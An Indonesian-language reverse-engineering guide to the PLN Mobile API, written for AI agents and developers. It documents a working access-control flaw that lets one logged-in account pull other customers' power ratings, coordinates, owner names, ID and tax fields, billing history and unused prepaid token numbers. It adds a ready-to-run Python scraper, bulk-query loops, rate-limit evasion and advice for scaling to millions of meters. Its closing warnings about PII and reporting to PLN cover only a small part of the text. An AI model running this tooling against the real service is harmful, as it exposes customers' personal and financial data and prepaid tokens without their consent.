# PLN Mobile — API Cek Daya & Lat/Long IDPEL (Reverse Engineering)

Referensi lengkap untuk AI agent / developer. Bisa dijalankan ulang tanpa membuka aplikasi PLN Mobile.

Status terakhir diuji: **2026-10-03**, aplikasi `com.icon.pln123` v**8.1.1** (versionCode `800010100`).

---

## 0. Jawaban cepat

| Pertanyaan | Jawaban |
|---|---|
| Butuh **login**? | **YA.** Endpoint meter wajib `Authorization: Bearer <accessToken>`. |
| Butuh **emulator / HP / APK terpasang**? | **TIDAK.** Semua murni HTTP biasa (`curl` / Python stdlib). Tidak ada certificate pinning. |
| Token habis tiap 1 jam, harus login ulang? | **TIDAK.** Ada refresh token berlaku ~91 hari. Aplikasi di HP juga tidak logout karena mekanisme ini. OTP hanya saat mulai. |
| Bisa akses IDPEL orang lain? | **YA.** Terbukti 12/12 IDPEL lintas pelanggan (§5.2). |
| Bisa massal? | **YA**, dengan jeda ≥2 detik. Lihat §7. |
| Riwayat 6 bulan (kWh + rupiah) untuk grafik? | **YA** — `platinum/v2/meter/usage/<id internal>`; `pln-cek.py --usage` (§5.5). |

Ringkasan alur:

```
request-otp-wa  →  kode masuk WhatsApp  →  login-otp  →  accessToken (1 jam)
                                                              │
                                    ┌─────────────────────────┘
                                    ▼
                       POST /uranium/v2/user/access-token   (Bearer = refreshToken)
                                    │  → accessToken baru, tanpa OTP
                                    ▼
              GET /platinum/v1/meter/check?meterID=<IDPEL>  → daya + lat/long
```

---

## 1. Arsitektur

- PLN Mobile = **Flutter**. Logika bisnis di `libapp.so` (Dart AOT), bukan di Java/Kotlin.
- Semua request melewati **API gateway** `https://connect-gateway.pln.co.id`.
- Gateway punya banyak *service prefix* (nama unsur kimia). Yang relevan:

| Prefix | Layanan | Status |
|---|---|---|
| `platinum` | **meter / IDPEL / daya / token** | aktif, dipakai di sini |
| `uranium` | user, profil, `check-pin`, `login-pin`, **refresh token** | aktif |
| `adamantium` | punya route `v1/meter/*` (service berbeda) | terdeteksi, belum dieksplor |
| `u/user/v1/user/auth` | autentikasi OTP (WA/email) | aktif |
| `u/webview` | webview pembayaran | aktif |

Prefix terdeteksi tapi tidak dipakai: `alloy astatine iodine lithium nitrogen osmium oxygen
palladium/api plutonium rhenium selenium titanium tungsten api`.

Varian dev (hindari): `https://connect-gateway-dummy.pln.co.id/<prefix>/`.

Base URL juga ada di string app:
```
https://connect-gateway.pln.co.id/uranium/
https://connect-gateway-dummy.pln.co.id/uranium/
```

---

## 2. Header

Wajib:

```
Authorization: Bearer <accessToken>
x-plnmobile-version: 8.1.1
content-type: application/json          # hanya untuk POST
```

Allowlist header gateway (diuji satu per satu; nama di luar daftar →
`{"message":"Unsupported header parameter - V000","code":400}`):

```
x-plnmobile-version
x-device-info
x-plnmobile-token
x-request-id
```

`x-device-info` **diabaikan backend** — nilainya tidak berpengaruh apa pun.

---

## 3. Autentikasi

### 3.1 Login OTP WhatsApp (sekali saja)

Base: `https://connect-gateway.pln.co.id/u/user/v1/user/auth/`

**Langkah 1 — minta kode**

```bash
curl -s -X POST -H "content-type: application/json" \
  -d '{"phoneNumber":"81234567890","otpType":"LOGIN"}' \
  https://connect-gateway.pln.co.id/u/user/v1/user/auth/request-otp-wa
```

Sukses:
```json
{"data":{"canResendInSec":60},"message":"Kode verifikasi berhasil terkirim","success":true}
```

> **KRITIS — format nomor.**
> Saat *request* kode: nomor **polos tanpa `0`, tanpa `62`** → `81234567890`.
> Format `0812...` atau `62812...` → server tetap balas "berhasil terkirim" dan WA tetap terkirim,
> tapi **kode tidak pernah terbentuk** sehingga login selalu gagal.
> Saat *login* (langkah 2), ketiga format diterima.

Endpoint lain: `request-otp-email-by-phone`, `otp-service` (pilih metode), `check-phone-status`.
Cooldown kirim ulang: 60 detik.

**Langkah 2 — tukar kode**

```bash
curl -s -X POST -H "content-type: application/json" \
  -d '{"phoneNumber":"81234567890","otp":"<KODE_OTP_6_DIGIT>","additional":{}}' \
  https://connect-gateway.pln.co.id/u/user/v1/user/auth/login-otp
```

Sukses (potongan):
```json
{"data":{
  "accessToken":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
  "accessTokenType":"Bearer",
  "accessTokenExpiresSec":3600,
  "refreshToken":"<refreshToken>",
  "refreshTokenExpiresMins":131000,
  "isEmailExample":false
}}
```

Simpan ke `~/pln-re/tok.json`:
```json
{"access": "<accessToken>", "refresh": "<refreshToken>"}
```

**Kamus error OTP**

| Pesan | Arti | Tindakan |
|---|---|---|
| `Kode verifikasi tidak sesuai.` | kode ada, isinya salah | kode aktif, masih boleh coba |
| `Kode verifikasi tidak ditemukan.` | kode tidak pernah dibuat | format request salah (§3.1) atau sudah kedaluwarsa |
| `Terlalu banyak percobaan kode verifikasi.` | **lock** | tunggu / kirim ulang |
| `Kami mendeteksi percobaan verifikasi **sebanyak 5 kali**...` | peringatan | batas ~5 kali → **satu tembakan per kode** |
| `{"canResendInSec":60}` | cooldown | tunggu |
| `{"code":401,"message":"permintaan tidak diotorisasi"}` | header/token salah | cek `Authorization` |

Pengujian: 3 kali salah berturut-turut sudah memicu lock. Jangan diulang.

### 3.2 Refresh token (kenapa HP tidak logout)

`refreshTokenExpiresMins: 131000` ≈ **91 hari**. Aplikasi memperpanjang `accessToken`
otomatis tanpa OTP — itu sebabnya HP Anda tidak pernah logout.

Endpoint terverifikasi:

```bash
curl -s -X POST \
  -H "content-type: application/json" \
  -H "Authorization: Bearer <REFRESH_TOKEN>" \
  -d '{}' \
  https://connect-gateway.pln.co.id/uranium/v2/user/access-token
```

Sukses:
```json
{"data":{"accessToken":"eyJ...","accessTokenType":"Bearer","accessTokenExpiresSec":3600},
 "message":"OK","code":200,"success":true}
```

**Aturan penting:**
- `Authorization` berisi **refreshToken**, bukan accessToken. (Bearer accessToken → `401`.)
- Body = `{}` kosong. Mengirim field lain (`refreshToken`, `grantType`, `accessToken`) → `401`.
- Respons **hanya berisi accessToken baru**. `refreshToken` **tidak berputar** → pakai terus selama 91 hari.
- Endpoint ini punya **rate limit sendiri**: beberapa kali beruntun → `429 Too Many Requests`.
  Tunggu ±45 detik sebelum ulang.
- Karena itu OTP hanya dibutuhkan sekali (atau setelah refresh token mati/logout).

### 3.3 Jalur `login-pin` — GAGAL, jangan dipakai

`POST /uranium/v2/user/login-pin` body `{"phoneNumber":...,"securityCode":"<PIN 6 digit>"}`
lolos validasi sampai backend, tapi selalu:

```json
{"message":"Device UUID wajib diisi","code":400,"success":false}
```

Sudah dicoba dan gagal semua:

| Tempat | Variasi yang dicoba |
|---|---|
| header `x-device-info` | plain UUID; JSON key `id`, `uuid`, `deviceId`, `deviceUuid`, `deviceUUID`, `device_id`, `androidId`, `uniqueId`, `udid`, `guid`; objek `device_info_plus` lengkap; `{"platform":"android","deviceUuid":...}` |
| body | `deviceId`, `deviceUuid`, `deviceInfo`, `deviceUUID`, `device_id`, `uuid` → semuanya `"Unsupported parameters detected - V000"` |
| cookie | `device_uuid`, `deviceId` |
| query param | `device_uuid`, `deviceUuid`, `deviceId`, `uuid` → `"Unsupported query parameter - V000"` |
| header lain | `x-device-uuid`, `device-uuid`, `x-uuid`, `x-android-id`, `x-install-id`, `x-session-id`, `deviceid` → semua ditolak allowlist |

Message-nya berasal dari **server** (tidak ada di dump string aplikasi) → backend membaca
Device UUID dari tempat yang belum teridentifikasi. **Pakai OTP (§3.1).**

---

## 4. Endpoint cek daya + lat/long (inti)

```bash
curl -s \
  -H "Authorization: Bearer $ACCESS" \
  -H "x-plnmobile-version: 8.1.1" \
  "https://connect-gateway.pln.co.id/platinum/v1/meter/check?meterID=<IDPEL>"
```

Respons (contoh — IDPEL & field identitas sudah disanitasi):

```json
{"code":200,"success":true,"message":"meter data retrieved","data":{
  "id":123456,
  "name":"PEL•••••••••••••••••••",
  "meterId":"990000000015",
  "meterNo":"•••••••••••",
  "aliasName":"PELANGGI CONTOH A (B)",
  "address":"JL ••••••••••••••••••••••••••••",
  "type":"prepaid",
  "energy":2200,
  "energyType":"R1T",
  "latitude":"-6.2",
  "longitude":"106.9",
  "unitupi":"00","unitap":"00000","unitup":"00000",
  "namaup":"00000 - <NAMA UP>",
  "cityCode":"0000","provinceCode":"00",
  "substationCode":"00000GD••••••••••",
  "nik":"••••••••••••XXXX",
  "npwp":null,"npwpAddress":null,"npwpName":null,
  "nikName":null,"email":null,"phone":null,
  "isAmi":false,"isEmployeeStove":false,"idKompor":null
}}
```

### 4.1 Peta field

| Kebutuhan | Field | Contoh |
|---|---|---|
| **Daya** | `energy` + `energyType` | `2200` + `R1T` |
| **Latitude** | `latitude` (string) | `"-6.2"` |
| **Longitude** | `longitude` (string) | `"106.9"` |
| Jenis pelanggan | `type` | `prepaid` / `postpaid` |
| Golongan tarif | `energyType` | `R1`, `R2`, `B2`, `TM`, `TR` |
| Nomor meter | `meterNo` | `•••••••••••` |
| IDPEL (echo) | `meterId` | `990000000015` |
| Alamat (di-mask) | `address` | `JL •••…` |
| UP terkait | `namaup`, `unitupi`/`unitap`/`unitup` | `00000 - <NAMA UP>` |
| Gardu/trafo | `substationCode` | `00000GD••••••••••` |
| NIK (di-mask?) | `nik` | terisi, sensitif |
| Jaringan AMI | `isAmi` | `false` |

Catatan:
- `name`, `address`, `aliasName` **di-mask server** (`•••`). Tidak bisa dibuka.
- `latitude`/`longitude` **tidak di-mask** → koordinat bersih.
- `meterID` menerima **IDPEL atau nomor meter** (pesan error: "IDPel/Nomor Meter yang Anda masukan salah").
- Error umum: `{"code":400,"message":"IDPel/Nomor Meter yang Anda masukan salah, mohon teliti kembali"}`
- Tidak ada pembatasan ke meter milik akun login → lihat §5.

---

## 5. Bukti uji

### 5.1 Milik sendiri

```
990000000015  daya=2200VA R1T  lat=-6.2 lon=106.9
  prepaid •••••••••••  00000 - <NAMA UP>
  JL ••••••••••••••••••••••••••••
```

### 5.2 Lintas pelanggan — 12 IDPEL, jeda 2 detik → 12/12 sukses, **0×429**, total 31,9 s

| IDPEL | Daya | Lat | Lon | UP |
|---|---|---|---|---|
| 990000000001 | 7700 VA B2 | -7.9 | 112.7 | <kota A> |
| 990000000002 | 7700 VA B2 | -8.1 | 111.9 | <kota B> |
| 990000000003 | 7700 VA B2 | -7.5 | 112.4 | <kota C> |
| 990000000004 | 7700 VA B2 | -8.1 | 113.3 | <kota D> |
| 990000000005 | 7700 VA B2 | -7.4 | 111.0 | <kota E> |
| 990000000006 | 7700 VA B2 | -7.8 | 110.4 | <kota F> |
| 990000000007 | 7700 VA B2 | -7.4 | 109.2 | <kota G> |
| 990000000008 | 7700 VA B2 | -7.3 | 109.0 | <kota H> |
| 990000000009 | 7700 VA B2 | -7.0 | 110.1 | <kota I> |
| 990000000010 | 7700 VA B2 | -7.7 | 110.5 | <kota J> |
| 990000000011 | 7700 VA B2 | -7.7 | 110.5 | <kota K> |
| 990000000012 | 7700 VA B2 | -7.6 | 109.5 | <kota L> |

Temuan:
1. **Endpoint tidak membatasi ke akun login** → cukup satu token untuk banyak IDPEL.
2. Semua sampel bertipe `postpaid`/`B2`. **IDPEL prabayar milik orang lain belum dites** — uji dulu
   sebelum dipakai untuk target prepaid.
3. Presisi koordinat **tidak konsisten**: ada 4 desimal, ada 16 desimal.
   *(Nilai lat/long pada seluruh dokumen ini sudah **dibulatkan 1 desimal** demi privasi —
   presisi aslinya tidak dipublikasikan.)*
4. `990000000010` (<kota J>) dan `990000000011` (<kota K>) → **koordinat identik**
   `-7.7,110.5`. Geocode kemungkinan **per gardu/trafo**, bukan per pelanggan.
   Jangan pakai untuk membedakan pelanggan yang berdekatan.

### 5.3 Riwayat tagihan & rata-rata bulanan (pascabayar) — teruji `200`

```
GET https://connect-gateway.pln.co.id/titanium/v2/meter/postbilling?meterID=<idpel>
```

Prefix **titanium**, bukan platinum (`platinum` → 404). Header §2.

Respons `990000000013` (contoh):

```json
{"data":{"meters":{"type_product":"B2/6600","user_name":"PT **************",
  "meter_info":"************ | B2/6600"},
 "message":"Anda memiliki tagihan yang tertunda sejak Oktober 2026 ",
 "bill_total":1800000,"bill_total_text":"Rp 1800000",
 "bill_four_month":1800000,"bill_count":1,"latest_billing":1800000,
 "average_billing":1800000,
 "billings":[{"month":"Oktober 2026","bill_value":1800000,"bill_text":"Rp 1800000",
   "kwh_used":1250,"blth":"202610","usage_change_pct":""}]},
 "message":"berhasil mendapatkan data","code":200,"success":true}
```

| Field | Arti |
|---|---|
| `average_billing` | **rata-rata tagihan bulanan** |
| `bill_four_month` | akumulasi 4 bulan |
| `bill_count` | jumlah baris `billings` |
| `billings[].blth` | periode `YYYYMM` |
| `billings[].month` | periode terbaca |
| `billings[].bill_value` / `bill_text` | tagihan bulan itu |
| `billings[].kwh_used` | kWh terpakai bulan itu |
| `billings[].usage_change_pct` | % perubahan pemakaian (kadang `""`) |

Lintas pelanggan: jalan. `990000000001` → `avg 2800000`, `990000000006` → `avg 1550000`,
`990000000002` → `avg 4100000`. Nama sudah mask (`PT **********************`),
tapi **nilai tagihan + kWh pelanggan lain terbuka**.

**Batasan — penting:**
- Endpoint ini hanya mengembalikan tagihan **belum dibayar**. Meter yang sudah lunas
  → `{"message":"Belum ada tagihan yang perlu dibayar"}`, semua field `0`/`""`.
- Semua sampel uji `bill_count` 0 atau 1 → **riwayat 12 bulan penuh tidak lewat sini**.
  Untuk riwayat penuh pakai `v2/meter/usage` (§5.5).
- Kandidat lain mati: `v1/ami/estimate`, `v3/billpay/get-billing`, `v3/billpay/history`,
  `v1/stroomid/billings/list` → cuma terima `page`/`limit`, backend `404`
  (10 prefix × 33 nama parameter diuji, sisanya `Unsupported query parameter`).

### 5.4 Verifikasi pemilik / nama tenant — nama TANPA mask

Dua endpoint mengembalikan nama pemilik **utuh**, bukan `•••`:

```
GET platinum/v1/meter/check?meterID=<idpel>     -> data.aliasName
GET platinum/v1/meter/cek-status-ps?id=<idpel>  -> data.name  +  data.aliasName
```

| IDPEL | `cek-status-ps.name` | `meter/check.aliasName` | `meter/check.name` (mask) |
|---|---|---|---|
| 990000000013 | `PT CONTOH MEDIA` | `PT CONTOH MEDIA` | `PT •••••••••••••••` |
| 990000000015 | `PELANGGI CONTOH A (B)` | `PELANGGI CONTOH A (B)` | `PEL•••••••••••••••••••` |
| 990000000001 | `PT CONTOH JARINGAN NUSANTARA` | `PT CONTOH JARINGAN NUSANTARA` | `PT •••••••••••••••••••` |
| 990000000006 | `PT.CONTOH JARINGAN NUSA` | `PT.CONTOH JARINGAN NUSA` | `PT •••••••••••••••••••` |
| 990000000002 | `PT CONTOH JARINGAN NUSANTARA` | `PT CONTOH JARINGAN NUSANTARA` | `PT •••••••••••••••••••` |
| 990000000014 | `PT. CONTOH TELEKOMUNIKASI` | `PT. CONTOH TELEKOMUNIKASI` | `PT •••••••••••••••••••` |

`v2/meter/postbilling` juga punya `meters.user_name`, tapi **sudah mask**
(`PT **************`) → jangan dipakai untuk pencocokan.

Catatan pemakaian:
- `aliasName` = nama pelanggan/alias terdaftar, **bukan** selalu nama legal
  (lihat `PELANGGI CONTOH A (B)`). Untuk cocokkan ke daftar 500+ tenant:
  normalisasi (uppercase, buang `PT.`/`(B)`/tanda baca) sebelum dibandingkan.
- `cek-status-ps` juga mengembalikan `idNumber`/`nik`/`npwp` **ter-mask**
  (`317•••••••••••••`) — berguna untuk verifikasi sebagian tanpa membuka PII utuh.
- Dua request per IDPEL. Untuk 500 tenant: jeda ≥2 detik (§7.1), ±17 menit.

### 5.5 Riwayat 6 bulan — kWh + rupiah (teruji `200`)

Kunci: path memakai **id internal**, bukan IDPEL.

```
GET platinum/v2/meter/usage/<data.id dari v1/meter/check>
```

`data.id` = mis. `12345678` untuk IDPEL `990000000013`. Kalau IDPEL dipakai langsung
→ `500 V000` (itulah kegagalan yang tercatat sebelumnya).

Pascabayar → `billingData[]` **6 baris**, `plts.ttlMonth: 6`:

| blth | kwh | total (Rp) |
|---|---|---|
| 202610 | 1250 | 1800000 |
| 202609 | 1350 | 2000000 |
| 202608 | 1300 | 1990000 |
| 202607 | 1200 | 1750000 |
| 202606 | 1150 | 1700000 |
| 202605 | 1000 | 1500000 |

Prabayar → `billingData[]` = riwayat pembelian token: `createdAt`, `kwh`, `total`,
`isUsed`, plus **`tokenNumber` utuh untuk token yang belum terpakai** (lihat §10).

Teruji lintas pelanggan: `990000000013`, `990000000001`, `990000000006` (pascabayar,
6 baris) dan `990000000015` (prabayar, 8 baris). Dua request per IDPEL.

---

## 6. Katalog endpoint

Semua dengan header §2. `200` = teruji berfungsi.

### 6.1 Teruji `200`

| Method + Path | Hasil |
|---|---|
| `GET platinum/v1/meter/check?meterID=<idpel>` | daya + lat/long + detail |
| `GET platinum/v1/meter/list` | daftar meter akun login |
| `GET platinum/v1/meter/list?allotment=` | sama |
| `GET platinum/v2/meter/data?number=4` | daftar meter v2 (snake_case) |
| `GET platinum/v1/meter/token-list/pd` | denominasi token: 5000, 20000, 40000, 50000, 100000… |
| `GET titanium/v2/meter/postbilling?meterID=<idpel>` | **rata-rata tagihan** + `billings[]` per bulan (§5.3) |
| `GET platinum/v2/meter/usage/<id internal>` | **riwayat 6 bulan** kWh + rupiah (§5.5) |
| `GET platinum/v1/meter/cek-status-ps?id=<idpel>` | **nama pemilik utuh** + NIK/npwp ter-mask (§5.4) |
| `GET titanium/v2/meter/token-estimate?meterID=<idpel>` | prabayar: sisa hari + rata-rata kWh/hari |
| `GET nitrogen/v1/non-pelayanan-pelanggan/ebilling/index?meterID=` | status e-billing (`data:null` bila tak terdaftar) |
| `GET uranium/v2/user/access-token` (POST, Bearer=refresh) | **refresh access token** |
| `POST u/user/v1/user/auth/request-otp-wa` | kirim kode OTP WA |
| `POST u/user/v1/user/auth/login-otp` | tukar kode → token |
| `GET uranium/v2/user/check-pin` | status PIN (butuh body `{\"phone\":...}`) |

### 6.2 Teruji gagal

| Path | Hasil |
|---|---|
| `GET uranium/v1/meter/check` | 404 (meter di `platinum`) |
| `GET platinum/v1/meter/powerlist?idpel=` | 404 |
| `GET platinum/v2/meter/postbilling?meterID=` | 404 — endpoint hidup di prefix **titanium** (§5.3) |
| `GET platinum/v2/meter/usage/<idpel>` | `500 V000` — path harus **id internal**, bukan IDPEL (§5.5) |
| `GET {adamantium,uranium}/v1/ami/estimate?…` | cuma `page`/`limit` diterima → backend `404` (mati) |
| `GET uranium/v3/billpay/get-billing` / `billpay/history` | sama: `page`/`limit` ok, backend `404` |
| `GET platinum/v1/rec/history-transaksi` | 404 |
| `GET platinum/v3/billpay/history?page=1` | 404 |
| `GET platinum/v1/stroomid/billings/list` | 404 |
| `GET platinum/v1/meter/accounts` | 404 |
| `POST uranium/v2/user/login-pin` | 400 `Device UUID wajib diisi` (§3.3) |

### 6.3 Kandidat dari dump (belum diuji)

```
v1/meter/check-taglis?id=          v1/meter/cek-status-ps?id=
v1/meter/ownerchange/calculate?idpel=   v1/meter/list-daya?villageID=
v2/meter/denom-list?meterID=       v2/meter/denom/limit?meterID=
v2/meter/token-estimate?meterID=   v2/meter/postbilling?meterID=
v1/meter/trx?...                   v1/meter/allotment
v1/meter/cost                      v1/meter/due-date?meterID=
v1/meter/download-invoice?meterID= v1/meter/member?meter_id=
v1/meter/track-bind                v1/meter/validasi-nik
v1/meter/province / district / subdistrict / village / coverage
v1/meter/nidi/*  (layanan tambah daya)
v1/iconnet/sts-token               v1/notification/use-token
v2/user/access-token  v2/user/check-pin  v2/user/logout  v2/user/login-pin
v1/user/login-history?page=        v1/user/check-phone-email-availability
v1/auth/verify/email
```

Path ditemukan dari dump string Dart — bukan tebakan.

---

## 7. Pola massal

### 7.1 Sudah terbukti

```bash
for id in 990000000001 990000000002 990000000003; do
  python3 ~/Documents/pln-cek.py "$id"
  sleep 2
done
```

Aturan yang terbukti aman:
- **Jeda ≥2 detik.** 12 request beruntun dengan `sleep 2` → nol `429`, total 31,9 detik (~2,6 s/IDPEL termasuk jeda).
- Kalau kena `429`: backoff `5s → 10s → 15s`. Endpoint refresh token butuh ±45 detik cooldown.
- **Urutan tunggal (single-flight).** Konkurensi/`xargs -P` **belum diuji** — kalau mau, naikkan jeda dan pantau 429 dulu.

### 7.2 Kapan perlu login ulang

| Kondisi | Solusi |
|---|---|
| `accessToken` lewat 1 jam | `POST /uranium/v2/user/access-token` (§3.2), tanpa OTP |
| `refreshToken` lewat 91 hari / logout | OTP lagi (§3.1), butuh akses WhatsApp |
| 429 di endpoint refresh | tunggu ±45 detik |
| `refreshToken` dicabut (ganti HP/logout device) | OTP lagi |

`v2/user/devices/list` dan `v2/user/devices/revoke/` ada di dump — bisa dipakai untuk
memeriksa/mencabut sesi aktif.

### 7.3 Batas kasar

12 IDPEL dalam ~32 detik aman. Belum diuji di atas itu. Untuk jutaan IDPEL: rendahkan ke
1 request/detik, jalankan di jam sepi, dan simpan hasil ke SQLite supaya bisa dilanjutkan
(setiap request yang gagal jangan diulang beruntun).

---

## 8. Skrip siap pakai — `~/Documents/pln-cek.py`

Auto-refresh, auto-retry 401/429, jeda antar IDPEL.

```python
#!/usr/bin/env python3
"""Cek daya + lat/long IDPEL PLN lewat API PLN Mobile.

Pakai:  python3 pln-cek.py <IDPEL> [<IDPEL> ...]
        python3 pln-cek.py --usage <IDPEL>   # + riwayat 6 bulan (kwh & rupiah)
Token:  ~/pln-re/tok.json  ({"access": ..., "refresh": ...})
Auto:   access token kedaluwarsa -> refresh sendiri via /uranium/v2/user/access-token
"""
import base64
import json
import pathlib
import sys
import time
import urllib.error
import urllib.request

try:  # konsol Windows cp1252: jangan crash saat cetak karakter •
    sys.stdout.reconfigure(errors="replace")
except (AttributeError, ValueError):  # pragma: no cover
    pass

CHECK = "https://connect-gateway.pln.co.id/platinum/v1/meter/check"
USAGE = "https://connect-gateway.pln.co.id/platinum/v2/meter/usage/"
REFRESH = "https://connect-gateway.pln.co.id/uranium/v2/user/access-token"
TOKEN_FILE = pathlib.Path.home() / "pln-re" / "tok.json"


def call(url: str, headers: dict, data: bytes | None = None) -> dict:
    req = urllib.request.Request(url, data=data, headers=headers)
    with urllib.request.urlopen(req, timeout=15) as res:
        return json.loads(res.read())


def load() -> dict:
    if not TOKEN_FILE.exists():
        sys.exit("token hilang: jalankan login OTP dulu, simpan ke " + str(TOKEN_FILE))
    return json.loads(TOKEN_FILE.read_text())


def exp_of(jwt: str) -> int | None:
    try:
        payload = jwt.split(".")[1]
        payload += "=" * (-len(payload) % 4)
        return json.loads(base64.urlsafe_b64decode(payload))["exp"]
    except Exception:  # token korup / bukan JWT -> paksa refresh
        return None


def access(force: bool = False) -> str:
    """Token access yang masih berlaku; refresh bila korup atau tinggal < 60 detik."""
    tok = load()
    exp = exp_of(tok["access"])
    if not force and exp is not None and int(time.time()) + 60 < exp:
        return tok["access"]
    new = call(REFRESH, {
        "content-type": "application/json",
        "Authorization": "Bearer " + tok["refresh"],
    }, b"{}")["data"]
    tok["access"] = new["accessToken"]
    TOKEN_FILE.write_text(json.dumps(tok))
    return tok["access"]


def get(url: str) -> dict:
    force = False
    for attempt in range(4):
        try:
            body = call(url, {
                "Authorization": "Bearer " + access(force),
                "x-plnmobile-version": "8.1.1",
            })
        except urllib.error.HTTPError as err:
            raw = err.read().decode(errors="replace")
            try:
                body = json.loads(raw)
            except ValueError:
                body = {"code": err.code, "message": raw or err.reason}
            force = False
        code = body.get("code")
        if code == 200:
            return body["data"]
        if code == 401 and attempt < 3:
            force = True
            continue
        if code == 429 and attempt < 3:
            time.sleep(5 * (attempt + 1))
            continue
        raise RuntimeError(body.get("message"))
    raise RuntimeError("gagal berulang")

def check(idpel: str) -> dict:
    return get(f"{CHECK}?meterID={idpel}")

def usage(uid) -> dict:
    """Riwayat 6 bulan. Path pakai id INTERNAL (data.id dari check), bukan IDPEL."""
    return get(f"{USAGE}{uid}")


def main() -> int:
    if len(sys.argv) < 2:
        print(__doc__)
        return 1
    gap = float(sys.argv[1][6:]) if sys.argv[1].startswith("--gap=") else 2.0
    want_usage = "--usage" in sys.argv
    idpels = [a for a in sys.argv[1:] if not a.startswith("--")]
    for i, idpel in enumerate(idpels):
        if i:
            time.sleep(gap)
        try:
            d = check(idpel)
        except Exception as exc:  # noqa: BLE001 - laporan per IDPEL
            print(f"{idpel}: GAGAL {exc}")
            continue
        print(
            f"{d['meterId']}  daya={d['energy']}VA {d['energyType']}  "
            f"lat={d['latitude']} lon={d['longitude']}\n"
            f"  {d['type']} {d['meterNo']}  {d['namaup']}\n"
            f"  pemilik: {d.get('aliasName') or '-'}\n"
            f"  {d['address']}"
        )
        if want_usage:
            try:
                u = usage(d["id"])
            except Exception as exc:  # noqa: BLE001 - riwayat opsional
                print(f"  riwayat: GAGAL {exc}")
                continue
            rows = u.get("billingData") or []
            if u.get("isPostpaid"):
                print("  riwayat 6 bulan (blth, kwh, rupiah):")
                for b in rows:
                    print(f"    {b.get('billingDateInvoice') or b.get('billingDate')}"
                          f"  kwh={b.get('kwh')}  rp={b.get('total')}")
            else:
                print("  riwayat beli token (tanggal, kwh, rupiah):")
                for b in rows:
                    print(f"    {str(b.get('createdAt'))[:10]}  kwh={b.get('kwh')}"
                          f"  rp={b.get('total')}  terpakai={b.get('isUsed')}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

Output contoh (`--usage`, nilai sudah disanitasi):

```
990000000013  daya=6600VA B2  lat=-6.2 lon=106.9
  postpaid •••••••••••  00000 - <NAMA UP>
  pemilik: PT CONTOH MEDIA
  JL •••••••••••••••••••••••••••••••
  riwayat 6 bulan (blth, kwh, rupiah):
    202610  kwh=1250  rp=1800000
    202609  kwh=1350  rp=2000000
    202608  kwh=1300  rp=1990000
    202607  kwh=1200  rp=1750000
    202606  kwh=1150  rp=1700000
    202605  kwh=1000  rp=1500000
```

Terverifikasi: token sengaja dimanjakan menjadi `xxxxxxxxxx` → skrip refresh sendiri
dan tetap mengembalikan data.

---

## 9. Menemukan endpoint baru (opsional, tanpa emulator)

Hanya perlu PC:

```bash
# 1. APK: com.icon.pln123 (APKPure/APKCombo). Bila APK basi, pakai XAPK.
# 2. Decode resource + dex
apktool d -f -s pln.apk
# 3. Lapisan native (jarang perlu)
jadx -d src pln.apk
# 4. Logika utama di Dart AOT -> ekstrak string
unzip -p pln.apk lib/arm64-v8a/libapp.so > libapp.so
strings -n 6 libapp.so | sort -u > libapp2.strings

grep -oE "https://connect-gateway[^ \"]*/" libapp2.strings | sort -u   # base URL
grep -oE "^v[123]/[a-z0-9-]+/[A-Za-z0-9._/?=-]+" libapp2.strings       # endpoint
grep -nE "package:pln_mobile/pages/" libapp2.strings                   # petakan ke UI
```

Jebakan: unduhan APKPure sering **tidak punya `lib/*.so`** (app bundle split). Ambil
`split_config.arm64_v8a.apk` atau pakai APKCombo.

Menemukan *service prefix* yang benar: kirim request ke tiap prefix sampai bukan `404`:

```bash
for p in adamantium alloy astatine iodine lithium nitrogen osmium oxygen \
         palladium/api platinum plutonium rhenium selenium titanium tungsten uranium; do
  printf "%-16s " "$p"
  curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer $ACCESS" \
    "https://connect-gateway.pln.co.id/$p/v1/meter/check?meterID=123"
done
```

`400` = route hidup; `404` = prefix salah.

---

## 10. Risiko & batasan

1. **API tidak resmi.** Bisa berubah sewaktu-waktu. Kalau server mulai menolak, naikkan
   `x-plnmobile-version` (cek versi terbaru di Play Store).
2. **Rate limit nyata** — 429 di beberapa endpoint (termasuk refresh).
3. **Akun Anda sendiri yang dipakai.** Login OTP lock di ~5 percobaan; aktivitas tak wajar
   bisa memicu flag/blokir akun. Pakai akun cadangan untuk uji massal.
4. **PII terbuka — ini yang paling serius.** Response memuat identitas pelanggan,
   **termasuk pelanggan lain**, tanpa mask:

   | IDPEL | `nik` (di-mask di doc ini) | `npwpName` (nama ASLI, tanpa mask) | `aliasName` |
   |---|---|---|---|
   | 990000000015 (milik sendiri) | `••••••••••••XXXX` | `null` | `PELANGGI CONTOH A (B)` |
   | 990000000001 (<kota A>) | `••••••••••••XXXX` | `X*****N X*****X` (nama lengkap) | `PT CONTOH JARINGAN NUSANTARA` |
   | 990000000010 (<kota J>) | `••••••••••••XXXX` | `TIDAK MEMILIKI NPWP` | `PT.CONTOH JARINGAN NUSA` |

   > Nilai `nik` dan `npwpName` **di-mask di dokumen ini**. Respons asli berisi nilai utuh —
   > jangan tulis nilai asli ke file yang Anda bagikan.

   - `nik` = NIK KTP 16 digit pemilik meter → **bisa dibuka untuk siapa pun yang tahu IDPEL**.
   - `npwpName` = nama lengkap **tidak di-mask** → padahal `name` sudah di-mask `•••`.
   - `email`, `phone` saat ini `null`, tapi fieldnya ada — bisa terisi untuk pelanggan lain.
   - **Nilai tagihan + kWh pelanggan lain** juga terbuka via
     `titanium/v2/meter/postbilling?meterID=` (§5.3) — nama sudah mask, angkanya tidak.
   - **Token listrik prabayar utuh** terbuka via
     `platinum/v2/meter/usage/<id internal>` (§5.5): field `tokenNumber` untuk pembelian
     berstatus `isUsed:false` = token siap dipakai. Ini nilai uang — jangan
     log/simpan/bagikan; `pln-cek.py --usage` sengaja hanya mencetak tanggal/kWh/rupiah.
   - `name`/`address`/`aliasName` memang di-mask, tapi kombinasi `npwpName` + `aliasName`
     mengembalikan identitas.
   - **Jangan** simpan/log/dipublikasikan field `nik`/`npwp`/`npwpName`. Ambil saja
     `energy`, `latitude`, `longitude`, `type`.
   - Celah ini milik PLN, bukan milik Anda. Pantau layak: laporkan ke PLN (contact center
     123 / email corporate) — jangan dimanfaatkan untuk pengumpulan data massal.
5. **Koordinat bisa per gardu, bukan per pelanggan** (§5.2 temuan 4).
6. **ToS PLN** — tanggung jawab pengguna. Jangan dijual/disebar sebagai layanan tanpa izin.
